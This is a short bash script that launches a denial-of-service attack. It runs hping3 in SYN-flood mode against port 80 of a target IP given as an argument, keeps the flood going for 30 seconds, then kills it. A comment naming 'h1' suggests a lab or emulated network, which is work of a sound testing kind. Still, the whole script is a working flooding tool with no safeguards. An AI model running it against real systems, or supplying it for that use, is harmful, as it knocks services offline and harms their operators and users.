#!/bin/bash

# Target IP address (h1 in this example)
TARGET_IP=$1

# Duration of the attack in seconds
DURATION=30

# Run the DDoS attack using hping3
echo "Starting DDoS attack on $TARGET_IP for $DURATION seconds..."
hping3 -S --flood -V -p 80 $TARGET_IP &
HPING3_PID=$!

# Sleep for the duration of the attack
sleep $DURATION

# Stop the attack
kill $HPING3_PID
echo "DDoS attack stopped."
